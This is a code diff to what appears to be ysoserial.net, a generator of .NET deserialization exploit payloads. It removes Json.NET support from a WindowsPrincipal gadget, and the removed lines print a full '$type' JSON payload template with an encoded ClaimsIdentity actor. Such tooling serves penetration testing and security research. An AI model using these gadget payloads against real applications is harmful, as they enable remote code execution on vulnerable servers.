@@ -33,7 +33,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter", "Json.Net", "DataContractSerializer", "DataContractJsonSerializer", "NetDataContractSerializer", "SoapFormatter", "LosFormatter", "ObjectStateFormatter" };
+            return new List<string> { "BinaryFormatter", "DataContractSerializer", "DataContractJsonSerializer", "NetDataContractSerializer", "SoapFormatter", "LosFormatter", "ObjectStateFormatter" };
         }
 
         public override string Name()
@@ -75,40 +75,6 @@ namespace ysoserial.Generators
                 WindowsPrincipalMarshal obj = new WindowsPrincipalMarshal();
                 obj.wi = id;
                 return Serialize(obj, formatter, inputArgs);
-            }
-            else if (formatter.ToLower().Equals("json.net"))
-            {
-                string payload = @"{
-                    '$type': 'System.Security.Principal.WindowsPrincipal, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
-                    'm_identity':{
-                        'System.Security.ClaimsIdentity.actor': '" + b64encoded + @"'
-                    }
-                }";
-
-                if (inputArgs.Minify)
-                {
-                    if (inputArgs.UseSimpleType)
-                    {
-                        payload = JSONMinifier.Minify(payload, new string[] { "mscorlib" }, null);
-                    }
-                    else
-                    {
-                        payload = JSONMinifier.Minify(payload, null, null);
-                    }
-                }
-
-                if (inputArgs.Test)
-                {
-                    try
-                    {
-                        SerializersHelper.JsonNet_deserialize(payload);
-                    }
-                    catch (Exception err)
-                    {
-                        Debugging.ShowErrors(inputArgs, err);
-                    }
-                }
-                return payload;
             }
             else if (formatter.ToLower().Equals("datacontractserializer"))
             {
